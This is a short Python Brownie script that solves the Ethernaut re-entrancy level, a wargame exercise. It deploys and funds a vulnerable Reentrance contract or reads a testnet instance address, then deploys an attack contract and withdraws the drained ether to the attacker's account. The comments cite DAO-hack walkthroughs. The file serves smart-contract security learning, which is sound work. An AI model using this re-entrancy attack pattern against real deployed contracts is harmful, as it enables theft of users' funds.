"""
Resources:
    DAO Hack: https://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/
    Solutions inspirations at: https://cmichel.io/ethernaut-solutions/
     and https://medium.com/coinmonks/ethernaut-lvl-10-re-entrancy-walkthrough-how-to-abuse-execution-ordering-and-reproduce-the-dao-7ec88b912c14
     thank you guys!
"""

from web3 import Web3
from brownie import Reentrance, ReentranceAttack, config, network
from scripts.helpers import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS


def initial_setup():
    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:
        # deploy the original Reentrance contract
        print("Deploying original Reentrance contract ...")
        deploying_account = get_account(1)
        reentrance_contract = Reentrance.deploy({"from": deploying_account})
        # fund reentrance contract from several different accounts
        print("Funding original reentrance contract ...")
        donator_one = get_account(2)
        donator_two = get_account(3)
        reentrance_contract.donate(deploying_account, {"from": deploying_account, "value": "1 ether"})
        reentrance_contract.donate(donator_one, {"from": donator_one, "value": "0.5 ether"})
        reentrance_contract.donate(donator_two, {"from": donator_two, "value": "1.1 ether"})
        total_balance = reentrance_contract.balance()
        print("Total number of donations: {}".format(total_balance))
        return reentrance_contract.address
    elif network.show_active() == "rinkeby":
        print("Getting reentrance contract address ...")
        return config["networks"][network.show_active()]["reentrance_instance"]
    else:
        return None


def reentrance_attack(reentrance_contract_address):
    hacking_account = get_account()
    # deploy the attack contract
    reentrance_attack_contract = ReentranceAttack.deploy(reentrance_contract_address, {"from": hacking_account})
    # attack the original contract
    attack = reentrance_attack_contract.attack({"from": hacking_account, "value": Web3.toWei("0.1", "ether")})
    # withdraw stolen funds from the attack contract and move to to the hacking account
    withdraw_contract = reentrance_attack_contract.withdrawContract(hacking_account)
    withdraw_contract.wait(1)
    

def main():
    reentrance_contract_address = initial_setup()
    reentrance_attack(reentrance_contract_address)